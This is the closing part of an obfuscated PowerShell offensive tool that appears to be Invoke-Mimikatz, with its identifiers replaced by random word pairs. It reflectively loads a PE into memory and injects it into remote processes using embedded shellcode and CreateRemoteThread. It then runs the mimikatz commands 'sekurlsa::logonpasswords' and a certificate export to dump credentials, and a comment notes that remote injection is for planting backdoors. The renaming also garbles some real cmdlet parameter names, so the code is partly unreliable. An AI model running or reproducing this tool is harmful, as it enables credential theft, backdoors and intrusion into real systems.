		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$AmazuluGasking = Get-PEDetailedInfo -BlinDefoam $BlinDefoam -BetteBryce $BetteBryce -FunksGoric $FunksGoric
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys EndAddress -CampingArkite $CowplopDatisi
		$AmazuluGasking | Add-Member -MemberType NoteProperty -CrenelsBatboys EffectivePEHandle -CampingArkite $AdanceAgag
		Write-Verbose "StartAddress: $BlinDefoam    EndAddress: $CowplopDatisi"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -AnnieCapered $AnnieCapered -AmazuluGasking $AmazuluGasking -CrinkleChapati $CrinkleChapati -BetteBryce $BetteBryce
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -AmazuluGasking $AmazuluGasking -ApsidesGuffaws $ApsidesGuffaws -FunksGoric $FunksGoric -BetteBryce $BetteBryce

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($CovenCurling -eq $true)
		{
			Import-DllImports -AmazuluGasking $AmazuluGasking -CrinkleChapati $CrinkleChapati -BetteBryce $BetteBryce -FunksGoric $FunksGoric -BragsFennecs $BragsFennecs
		}
		else
		{
			Import-DllImports -AmazuluGasking $AmazuluGasking -CrinkleChapati $CrinkleChapati -BetteBryce $BetteBryce -FunksGoric $FunksGoric
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($CovenCurling -eq $false)
		{
			if ($BatelCircum -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -AmazuluGasking $AmazuluGasking -CrinkleChapati $CrinkleChapati -FunksGoric $FunksGoric -BetteBryce $BetteBryce
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($CovenCurling -eq $true)
		{
			[UInt32]$DriesGarrote = 0
			$FloodyBouton = $CrinkleChapati.WriteProcessMemory.Invoke($BragsFennecs, $AdanceAgag, $BlinDefoam, [UIntPtr]($AmazuluGasking.SizeOfImage), [Ref]$DriesGarrote)
			if ($FloodyBouton -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($AmazuluGasking.FileType -ieq "DLL")
		{
			if ($CovenCurling -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$AngelotAutism = Add-SignedIntAsUnsigned ($AmazuluGasking.PEHandle) ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$FlokatiFique = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$AmbosBagreef = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AngelotAutism, $FlokatiFique)
				
				$AmbosBagreef.Invoke($AmazuluGasking.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$AngelotAutism = Add-SignedIntAsUnsigned ($AdanceAgag) ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($AmazuluGasking.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$AirbagsCoitus = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$BoehmerBrumal = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CurrieChumps = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$AirbagsCoitus = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$BoehmerBrumal = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CurrieChumps = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$FaradicGriffes = $AirbagsCoitus.Length + $BoehmerBrumal.Length + $CurrieChumps.Length + ($BedungGrating * 2)
				$BaittleEpaule = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FaradicGriffes)
				$BandsawCrimes = $BaittleEpaule
				
				Write-BytesToMemory -BuffyGarbage $AirbagsCoitus -FinchedAronia $BaittleEpaule
				$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($AirbagsCoitus.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($AdanceAgag, $BaittleEpaule, $false)
				$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
				Write-BytesToMemory -BuffyGarbage $BoehmerBrumal -FinchedAronia $BaittleEpaule
				$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BoehmerBrumal.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($AngelotAutism, $BaittleEpaule, $false)
				$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($BedungGrating)
				Write-BytesToMemory -BuffyGarbage $CurrieChumps -FinchedAronia $BaittleEpaule
				$BaittleEpaule = Add-SignedIntAsUnsigned $BaittleEpaule ($CurrieChumps.Length)
				
				$DuadsDaffier = $CrinkleChapati.VirtualAllocEx.Invoke($BragsFennecs, [IntPtr]::Zero, [UIntPtr][UInt64]$FaradicGriffes, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_EXECUTE_READWRITE)
				if ($DuadsDaffier -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$FloodyBouton = $CrinkleChapati.WriteProcessMemory.Invoke($BragsFennecs, $DuadsDaffier, $BandsawCrimes, [UIntPtr][UInt64]$FaradicGriffes, [Ref]$DriesGarrote)
				if (($FloodyBouton -eq $false) -or ([UInt64]$DriesGarrote -ne [UInt64]$FaradicGriffes))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$CornrowBalm = Invoke-DingeBolivar -AmorousEscars $BragsFennecs -GloriaDivel $DuadsDaffier -CrinkleChapati $CrinkleChapati
				$CoelomFlukily = $CrinkleChapati.WaitForSingleObject.Invoke($CornrowBalm, 20000)
				if ($CoelomFlukily -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$CrinkleChapati.VirtualFreeEx.Invoke($BragsFennecs, $DuadsDaffier, [UIntPtr][UInt64]0, $FunksGoric.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($AmazuluGasking.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$DenudedFaff = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($DenudedFaff, 0, 0x00)
			$AbyssesAspires = Update-ExeFunctions -AmazuluGasking $AmazuluGasking -CrinkleChapati $CrinkleChapati -FunksGoric $FunksGoric -AnitherFoins $BobbishCharmed -DenudedFaff $DenudedFaff

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$DressComic = Add-SignedIntAsUnsigned ($AmazuluGasking.PEHandle) ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $DressComic. Creating thread for the EXE to run in."

			$CrinkleChapati.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $DressComic, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ArbiterCaml = [System.Runtime.InteropServices.Marshal]::ReadByte($DenudedFaff, 0)
				if ($ArbiterCaml -eq 1)
				{
					Copy-ArrayOfMemAddresses -AntimanAlkies $AbyssesAspires -CrinkleChapati $CrinkleChapati -FunksGoric $FunksGoric
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($AmazuluGasking.PEHandle, $AdanceAgag)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$BlinDefoam
		)
		
		#Get Win32 constants and functions
		$FunksGoric = Get-FunksGoric
		$CrinkleChapati = Get-CrinkleChapati
		$BetteBryce = Get-GeoData
		
		$AmazuluGasking = Get-PEDetailedInfo -BlinDefoam $BlinDefoam -BetteBryce $BetteBryce -FunksGoric $FunksGoric
		
		#Call FreeLibrary for all the imports of the DLL
		if ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ErogenyBodying = Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.PEHandle) ([Int64]$AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$BroodyDraggy = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ErogenyBodying, [Type]$BetteBryce.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($BroodyDraggy.Characteristics -eq 0 `
						-and $BroodyDraggy.FirstThunk -eq 0 `
						-and $BroodyDraggy.ForwarderChain -eq 0 `
						-and $BroodyDraggy.Name -eq 0 `
						-and $BroodyDraggy.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$CyperusBroth = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.PEHandle) ([Int64]$BroodyDraggy.Name)))
				$DianeHaff = $CrinkleChapati.GetModuleHandle.Invoke($CyperusBroth)

				if ($DianeHaff -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $CyperusBroth. Continuing anyways" -WarningAction Continue
				}
				
				$FloodyBouton = $CrinkleChapati.FreeLibrary.Invoke($DianeHaff)
				if ($FloodyBouton -eq $false)
				{
					Write-Warning "Unable to free library: $CyperusBroth. Continuing anyways." -WarningAction Continue
				}
				
				$ErogenyBodying = Add-SignedIntAsUnsigned ($ErogenyBodying) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$AngelotAutism = Add-SignedIntAsUnsigned ($AmazuluGasking.PEHandle) ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$FlokatiFique = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$AmbosBagreef = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AngelotAutism, $FlokatiFique)
		
		$AmbosBagreef.Invoke($AmazuluGasking.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$FloodyBouton = $CrinkleChapati.VirtualFree.Invoke($BlinDefoam, [UInt64]0, $FunksGoric.MEM_RELEASE)
		if ($FloodyBouton -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$CrinkleChapati = Get-CrinkleChapati
		$BetteBryce = Get-GeoData
		$FunksGoric =  Get-FunksGoric
		
		$BragsFennecs = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($EnneadAgon -ne $null) -and ($EnneadAgon -ne 0) -and ($AratoryDisnew -ne $null) -and ($AratoryDisnew -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($AratoryDisnew -ne $null -and $AratoryDisnew -ne "")
		{
			$ChortenDraco = @(Get-Process -CrenelsBatboys $AratoryDisnew -ErrorAction SilentlyContinue)
			if ($ChortenDraco.Count -eq 0)
			{
				Throw "Can't find process $AratoryDisnew"
			}
			elseif ($ChortenDraco.Count -gt 1)
			{
				$EphodsBrevet = Get-Process | where { $_.Name -eq $AratoryDisnew } | Select-Object ProcessName, Id, SessionId
				Write-BespitGonial $EphodsBrevet
				Throw "More than one instance of $AratoryDisnew found, please specify the process ID to inject in to."
			}
			else
			{
				$EnneadAgon = $ChortenDraco[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $AndeanBosher).SessionId -ne (Get-Process -Id $EnneadAgon).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -CrinkleChapati $CrinkleChapati -BetteBryce $BetteBryce -FunksGoric $FunksGoric
#		}	
		
		if (($EnneadAgon -ne $null) -and ($EnneadAgon -ne 0))
		{
			$BragsFennecs = $CrinkleChapati.OpenProcess.Invoke(0x001F0FFF, $false, $EnneadAgon)
			if ($BragsFennecs -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $EnneadAgon"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $GeldersGlyster = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($GeldersGlyster -is [array])
        {
            $DivviesChupon = $GeldersGlyster[0]
        } else {
            $DivviesChupon = $GeldersGlyster
        }

        if ( ( $DivviesChupon.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $DivviesChupon.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$AnnieCapered = [Byte[]][Convert]::FromBase64String($GoopierAnlas)
        }
        else
        {
            [Byte[]]$AnnieCapered = [Byte[]][Convert]::FromBase64String($DargGabon)
        }
        $AnnieCapered[0] = 0
        $AnnieCapered[1] = 0
		$BlinDefoam = [IntPtr]::Zero
		if ($BragsFennecs -eq [IntPtr]::Zero)
		{
			$AptnessFarcy = Invoke-MemoryLoadLibrary -AnnieCapered $AnnieCapered -BobbishCharmed $BobbishCharmed
		}
		else
		{
			$AptnessFarcy = Invoke-MemoryLoadLibrary -AnnieCapered $AnnieCapered -BobbishCharmed $BobbishCharmed -BragsFennecs $BragsFennecs
		}
		if ($AptnessFarcy -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$BlinDefoam = $AptnessFarcy[0]
		$ButtleGested = $AptnessFarcy[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$AmazuluGasking = Get-PEDetailedInfo -BlinDefoam $BlinDefoam -BetteBryce $BetteBryce -FunksGoric $FunksGoric
		if (($AmazuluGasking.FileType -ieq "DLL") -and ($BragsFennecs -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$CorkeHackly = Get-MemoryProcAddress -BlinDefoam $BlinDefoam -ChrysinChuppas "powershell_reflective_mimikatz"
				    if ($CorkeHackly -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $DatiscaCoropo = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $GyronnyCoed = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CorkeHackly, $DatiscaCoropo)
                    $EulogyFlings = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($BobbishCharmed)
				    [IntPtr]$GoingEgba = $GyronnyCoed.Invoke($EulogyFlings)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($EulogyFlings)
				    if ($GoingEgba -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $BespitGonial = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($GoingEgba)
				        Write-BespitGonial $BespitGonial
				        $CrinkleChapati.LocalFree.Invoke($GoingEgba);
				    }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($AmazuluGasking.FileType -ieq "DLL") -and ($BragsFennecs -ne [IntPtr]::Zero))
		{
			$AeroseAmbassy = Get-MemoryProcAddress -BlinDefoam $BlinDefoam -ChrysinChuppas "VoidFunc"
			if (($AeroseAmbassy -eq $null) -or ($AeroseAmbassy -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$AeroseAmbassy = Sub-SignedIntAsUnsigned $AeroseAmbassy $BlinDefoam
			$AeroseAmbassy = Add-SignedIntAsUnsigned $AeroseAmbassy $ButtleGested
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$CornrowBalm = Invoke-DingeBolivar -AmorousEscars $BragsFennecs -GloriaDivel $AeroseAmbassy -CrinkleChapati $CrinkleChapati
		}
		
		#Don't free a library if it is injected in a remote process
		if ($BragsFennecs -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -BlinDefoam $BlinDefoam
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$FloodyBouton = $CrinkleChapati.VirtualFree.Invoke($BlinDefoam, [UInt64]0, $FunksGoric.MEM_RELEASE)
			if ($FloodyBouton -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($DelticCulexes.MyInvocation.BoundParameters["Debug"] -ne $null) -and $DelticCulexes.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$FlanesAutoma  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $AndeanBosher"
	

	if ($DelticCulexes.ParameterSetName -ieq "RunPreCheck")
	{
		$BobbishCharmed = "sekurlsa::logonpasswords exit"
	}
    elseif ($DelticCulexes.ParameterSetName -ieq "DumpCerts")
    {
        $BobbishCharmed = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $BobbishCharmed = $BermedBrochan
    }

    [System.IO.Directory]::SetCurrentDirectory($GrallicDegage)

    
    # SHA256 hash: c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae
    # https://www.virustotal.com/en/file/c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae/analysis/1450152913/

	if ($BladersDemerit -eq $null -or $BladersDemerit -imatch "^\s*$")
	{
		Invoke-BermedBrochan -ScriptBlock $BluingsBettine -ArgumentList @($GoopierAnlas, $DargGabon, "Void", 0, "", $BobbishCharmed)
	}
	else
	{
		Invoke-BermedBrochan -ScriptBlock $BluingsBettine -ArgumentList @($GoopierAnlas, $DargGabon, "Void", 0, "", $BobbishCharmed) -BladersDemerit $BladersDemerit
	}
}

Main
}

